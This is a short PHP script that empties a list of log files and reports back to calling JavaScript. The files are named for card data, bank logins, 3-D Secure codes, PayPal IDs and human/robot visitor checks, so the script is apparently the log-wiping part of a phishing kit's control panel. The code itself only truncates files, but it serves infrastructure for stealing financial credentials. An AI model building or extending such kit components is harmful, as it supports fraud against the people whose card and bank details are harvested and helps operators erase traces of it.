<?php
// Array of files to clear
$filesToClear = [
    "../Static/log_click.txt",
    "../Static/log_account.txt",
    "../Static/log_email.txt",
    "../Static/log_cc.txt",
    "../Static/log_bank.txt",
    "../Static/log_3dsecure.txt",
    "../Static/log_papid.txt",
    "../Static/log_human.txt",
    "../Static/log_robot.txt",
];
// Loop through each file and clear its contents
foreach ($filesToClear as $file) {
    if (file_exists($file)) {
        // Clear the content of the file by writing an empty string to it
        file_put_contents($file, '');
    }
}
// Respond back to the JavaScript that the logs were deleted successfully
echo "Logs deleted successfully.";
?>
